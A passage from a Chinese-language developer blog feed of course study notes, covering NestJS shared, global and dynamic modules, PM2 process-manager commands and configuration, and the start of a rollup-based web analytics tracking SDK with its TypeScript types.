class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="comment">// 引入了模块</span></span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">UserModule</span>, <span class="title class_">ListModule</span>],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="共享模块"><a href="#共享模块" class="headerlink" title="共享模块"></a>共享模块</h2><p>user不是一个共享模块，所以user Service的一切只能在user模块内部使用，在其他模块使用会报错：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308011513555.png"></p>
<p>可以在user.module.ts中导出Service：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.controller&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">UserController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">UserService</span>],</span><br><span class="line">  <span class="comment">// 导出UserService</span></span><br><span class="line">  <span class="attr">exports</span>: [<span class="title class_">UserService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>这下就不会报错了：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308011553048.png"></p>
<h2 id="全局模块"><a href="#全局模块" class="headerlink" title="全局模块"></a>全局模块</h2><p>给模块添加@Global使其被注册为全局模块</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Global</span>, <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Global</span>()</span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">providers</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">provide</span>: <span class="string">&#x27;Config&#x27;</span>,</span><br><span class="line">      <span class="attr">useValue</span>: &#123; <span class="attr">baseUrl</span>: <span class="string">&#x27;/api&#x27;</span> &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 即使已注册成全局模块仍然要做导出</span></span><br><span class="line">  <span class="attr">exports</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">provide</span>: <span class="string">&#x27;Config&#x27;</span>,</span><br><span class="line">      <span class="attr">useValue</span>: &#123; <span class="attr">baseUrl</span>: <span class="string">&#x27;/api&#x27;</span> &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">ConfigModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在根模块里引入全局模块ConfigModule：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ListModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./list/list.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ConfigModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./config/config.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="comment">// 引入了模块</span></span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">UserModule</span>, <span class="title class_">ListModule</span>, <span class="title class_">ConfigModule</span>],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在list.controller.ts中使用全局模块，不需要使用import（可以全局使用）：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Inject</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ListService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./list.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateListDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-list.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateListDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-list.dto&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;list&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">ListController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="meta">@Inject</span>(<span class="string">&#x27;Config&#x27;</span>) <span class="keyword">private</span> <span class="keyword">readonly</span> base: <span class="built_in">any</span></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">base</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="动态模块"><a href="#动态模块" class="headerlink" title="动态模块"></a>动态模块</h2><p>使用动态模块主要是为给模块传递参数，可以给该模块添加一个静态方法，用来接受参数</p>
<p>在config.module.ts中，forRoot就是能接收参数的静态方法：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">DynamicModule</span>, <span class="title class_">Global</span>, <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Options</span> &#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Global</span>()</span><br><span class="line"><span class="meta">@Module</span>(&#123;&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">ConfigModule</span> &#123;</span><br><span class="line">  <span class="comment">// 使用静态函数forRoot</span></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">forRoot</span>(<span class="attr">options</span>: <span class="title class_">Options</span>): <span class="title class_">DynamicModule</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">module</span>: <span class="title class_">ConfigModule</span>,</span><br><span class="line">      <span class="attr">providers</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">provide</span>: <span class="string">&#x27;Config&#x27;</span>,</span><br><span class="line">          <span class="attr">useValue</span>: &#123; <span class="attr">baseUrl</span>: <span class="string">&#x27;/api&#x27;</span> + options.<span class="property">path</span> &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">      <span class="comment">// 即使已注册成全局模块仍然要做导出</span></span><br><span class="line">      <span class="attr">exports</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">provide</span>: <span class="string">&#x27;Config&#x27;</span>,</span><br><span class="line">          <span class="attr">useValue</span>: &#123; <span class="attr">baseUrl</span>: <span class="string">&#x27;/api&#x27;</span> &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在app.module.ts中，注册ConfigModule中的该静态方法，并传参：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ListModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./list/list.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ConfigModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./config/config.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="comment">// 引入时把静态方法引进来，还能传个参</span></span><br><span class="line">  <span class="attr">imports</span>: [</span><br><span class="line">    <span class="title class_">UserModule</span>,</span><br><span class="line">    <span class="title class_">ListModule</span>,</span><br><span class="line">    <span class="title class_">ConfigModule</span>.<span class="title function_">forRoot</span>(&#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;./root&#x27;</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>PM2</title>
    <url>/web/study/Others/PM2.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="PM2"><a href="#PM2" class="headerlink" title="PM2"></a>PM2</h1><p>PM2是node应用进程管理工具，可以用它简化很多node应用管理的繁琐任务，如性能监控、自动重启、负载均衡等</p>
<p>不使用PM2时，在工作中遇到服务器重启后，需要一个个去重新启动每个服务，这样不仅繁琐、效率低，而且容易忘记开启一些服务</p>
<p>PM2的主要特性：</p>
<ul>
<li>内建负载均衡（使用Node cluster集群模块）</li>
<li>后台运行</li>
<li>0秒停机重载</li>
<li>具有Ubuntu和CentOS的启动脚本</li>
<li>自动停止不稳定的进程（避免无限循环）</li>
<li>控制台检测</li>
<li>提供HTTP API</li>
<li>远程控制和实时的接口API（Nodejs 模块，允许和PM2进程管理器交互）</li>
</ul>
<h1 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h1><p>安装PM2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g pm2</span><br></pre></td></tr></table></figure>

<hr>
<p>启动PM2服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 start app.js</span></span><br></pre></td></tr></table></figure>

<p>如果启动成功，status就为online：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261633440.png"></p>
<hr>
<p>启动PM2服务并监听文件变化，更改文件后服务会自动重启：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 start app.js --watch</span></span><br></pre></td></tr></table></figure>

<hr>
<p>启动PM2服务并配置集群数，实现负载均衡，n为数字时指定进程数，为0或max时是机器最大进程数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 start app.js -i <span class="string">&quot;num&quot;</span></span></span><br></pre></td></tr></table></figure>

<hr>
<p>启动PM2服务并自定义服务名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 start app.js -n <span class="string">&quot;name&quot;</span></span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261649323.png"></p>
<hr>
<p>查看PM2日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261634471.png"></p>
<hr>
<p>查看PM2服务表：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 list</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261638720.png"></p>
<hr>
<p>根据id或名字停止某一个服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 stop 0</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261640991.png"></p>
<hr>
<p>根据id或名字重启某一个服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 restart index</span></span><br></pre></td></tr></table></figure>

<hr>
<p>停止所有服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 stop all</span></span><br></pre></td></tr></table></figure>

<hr>
<p>根据id删除某一个服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 delete 0</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261641930.png"></p>
<hr>
<p>删除所有服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 delete all</span></span><br></pre></td></tr></table></figure>

<hr>
<p>监控PM2的进程状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 monit</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306261721125.png"></p>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;apps&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;express_project&quot;</span><span class="punctuation">,</span>       <span class="comment">// 项目名          </span></span><br><span class="line">        <span class="attr">&quot;script&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app.js&quot;</span><span class="punctuation">,</span>              <span class="comment">// 执行文件</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span>                     <span class="comment">// 根目录</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>                      <span class="comment">// 传递给脚本的参数</span></span><br><span class="line">        <span class="attr">&quot;interpreter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>               <span class="comment">// 指定的脚本解释器</span></span><br><span class="line">        <span class="attr">&quot;interpreter_args&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>          <span class="comment">// 传递给解释器的参数</span></span><br><span class="line">        <span class="attr">&quot;watch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                   <span class="comment">// 是否监听文件变动然后重启</span></span><br><span class="line">        <span class="attr">&quot;ignore_watch&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                <span class="comment">// 不用监听的文件</span></span><br><span class="line">            <span class="string">&quot;node_modules&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;public&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;exec_mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cluster_mode&quot;</span><span class="punctuation">,</span>     <span class="comment">// 应用启动模式，支持 fork 和 cluster 模式</span></span><br><span class="line">        <span class="attr">&quot;instances&quot;</span><span class="punctuation">:</span> <span class="string">&quot;max&quot;</span><span class="punctuation">,</span>              <span class="comment">// 应用启动实例个数，仅在 cluster 模式有效 默认为 fork</span></span><br><span class="line">        <span class="attr">&quot;error_file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./logs/app-err.log&quot;</span><span class="punctuation">,</span>         <span class="comment">// 错误日志文件</span></span><br><span class="line">        <span class="attr">&quot;out_file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./logs/app-out.log&quot;</span><span class="punctuation">,</span>           <span class="comment">// 正常日志文件</span></span><br><span class="line">        <span class="attr">&quot;merge_logs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                         <span class="comment">// 设置追加日志而不是新建日志</span></span><br><span class="line">        <span class="attr">&quot;log_date_format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YYYY-MM-DD HH:mm:ss&quot;</span><span class="punctuation">,</span>   <span class="comment">// 指定日志文件的时间格式</span></span><br><span class="line">        <span class="attr">&quot;min_uptime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;60s&quot;</span><span class="punctuation">,</span>                        <span class="comment">// 应用运行少于时间被认为是异常启动</span></span><br><span class="line">        <span class="attr">&quot;max_restarts&quot;</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span>                         <span class="comment">// 最大异常重启次数</span></span><br><span class="line">        <span class="attr">&quot;autorestart&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                        <span class="comment">// 默认为 true, 发生异常的情况下自动重启</span></span><br><span class="line">        <span class="attr">&quot;restart_delay&quot;</span><span class="punctuation">:</span> <span class="string">&quot;60&quot;</span>                       <span class="comment">// 异常重启情况下，延时重启时间</span></span><br><span class="line">        <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;NODE_ENV&quot;</span><span class="punctuation">:</span> <span class="string">&quot;production&quot;</span><span class="punctuation">,</span>                <span class="comment">// 环境参数，当前指定为生产环境</span></span><br><span class="line">           <span class="attr">&quot;REMOTE_ADDR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span>               </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;env_dev&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;NODE_ENV&quot;</span><span class="punctuation">:</span> <span class="string">&quot;development&quot;</span><span class="punctuation">,</span>              <span class="comment">// 环境参数，当前指定为开发环境</span></span><br><span class="line">            <span class="attr">&quot;REMOTE_ADDR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;env_test&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>                               <span class="comment">// 环境参数，当前指定为测试环境</span></span><br><span class="line">            <span class="attr">&quot;NODE_ENV&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;REMOTE_ADDR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>按配置文件启动pm2服务时，应使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pm2 start pm2.json</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Node.js</tag>
        <tag>Pm2</tag>
      </tags>
  </entry>
  <entry>
    <title>埋点SDK</title>
    <url>/web/study/Others/%E5%9F%8B%E7%82%B9SDK.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1Fa411T7uY?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满埋点SDK从0开发并且发布npm（完结）</a></p>
<h1 id="埋点"><a href="#埋点" class="headerlink" title="埋点"></a>埋点</h1><p>就是数据采集、数据处理、数据分析和挖掘，如用户停留时间，用户点击情况等</p>
<h1 id="库设计"><a href="#库设计" class="headerlink" title="库设计"></a>库设计</h1><p>webpack臃肿，可读性差，但适合开发一些项目</p>
<p>rollup打包干净，所以非常适合开发SDK和一些框架</p>
<p>此处就使用rollup作为打包工具</p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307241542812.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307241542278.png"></p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install rollup -D</span><br><span class="line">npm install rollup-plugin-dts -D</span><br><span class="line">npm install rollup-plugin-typescript2 -D</span><br><span class="line">npm install typescript -D</span><br></pre></td></tr></table></figure>

<h2 id="打包工具配置"><a href="#打包工具配置" class="headerlink" title="打包工具配置"></a>打包工具配置</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ts <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-typescript2&quot;</span></span><br><span class="line"><span class="keyword">import</span> dts <span class="keyword">from</span> <span class="string">&#x27;rollup-plugin-dts&#x27;</span>  <span class="comment">// 生成声明文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> [</span><br><span class="line">  <span class="comment">// 输出主要代码</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">input</span>: <span class="string">&quot;./src/core/index.ts&quot;</span>,</span><br><span class="line">    <span class="comment">// es: import export</span></span><br><span class="line">    <span class="comment">// cjs: require exports</span></span><br><span class="line">    <span class="comment">// umd: AMD CMD global</span></span><br><span class="line">    <span class="attr">output</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">file</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;./dist/index.esm.js&quot;</span>),</span><br><span class="line">        <span class="attr">format</span>: <span class="string">&quot;es&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">file</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;./dist/index.cjs.js&quot;</span>),</span><br><span class="line">        <span class="attr">format</span>: <span class="string">&quot;cjs&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">file</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;./dist/index.js&quot;</span>),</span><br><span class="line">        <span class="attr">format</span>: <span class="string">&quot;umd&quot;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;tracker&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="title function_">ts</span>(),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 输出声明文件</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">input</span>: <span class="string">&quot;./src/core/index.ts&quot;</span>,</span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">      <span class="attr">file</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;./dist/index.d.ts&quot;</span>),</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&quot;es&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="title function_">dts</span>(),</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 配置项的类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@requestUrl</span> 接口地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@historyTracker</span> history上报</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@hashTracker</span> hash上报</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@domTracker</span> 携带Tracker-key 点击事件上报</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@sdkVersionsdk</span>版本</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@extra</span>透传字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@jsError</span> js和promise报错异常上报</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">DefaultOptons</span> &#123;</span><br><span class="line">  <span class="attr">uuid</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>,</span><br><span class="line">  <span class="attr">requestUrl</span>: <span class="built_in">string</span> | <span class="literal">undefined</span>,</span><br><span class="line">  <span class="attr">historyTracker</span>: <span class="built_in">boolean</span>,</span><br><span class="line">  <span class="attr">hashTracker</span>: <span class="built_in">boolean</span>,</span><br><span class="line">  <span class="attr">domTracker</span>: <span class="built_in">boolean</span>,</span><br><span class="line">  <span class="attr">sdkVersion</span>: <span class="built_in">string</span> | <span class="built_in">number</span>,</span><br><span class="line">  <span class="attr">extra</span>: <span class="title class_">Record</span>&lt;<span class="built_in">string</span>, <span class="built_in">any</span>&gt; | <span class="literal">undefined</span>,</span><br><span class="line">  <span class="attr">jsError</span>:<span class="built_in">boolean</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//requestUrl必传，其他配置项可不传</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Options</span> <span class="keyword">extends</span> <span class="title class_">Partial</span>&lt;<span class="title class_">DefaultOptons</span>&gt; &#123;</span><br><span class="line">  <span class="attr">requestUrl</span>: <span class="built_in">string</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//版本</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">enum</span> <span class="title class_">TrackerConfig</span> &#123;</span><br><span class="line">  version = <span class="string">&#x27;1.0.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上报必传参数</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> reportTrackerData = &#123;</span><br><span class="line">  [<span class="attr">key</span>: <span class="built_in">string</span>]: <span class="built_in">any</span>,</span><br><span class="line">  <span class="attr">event</span>: <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">targetKey</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

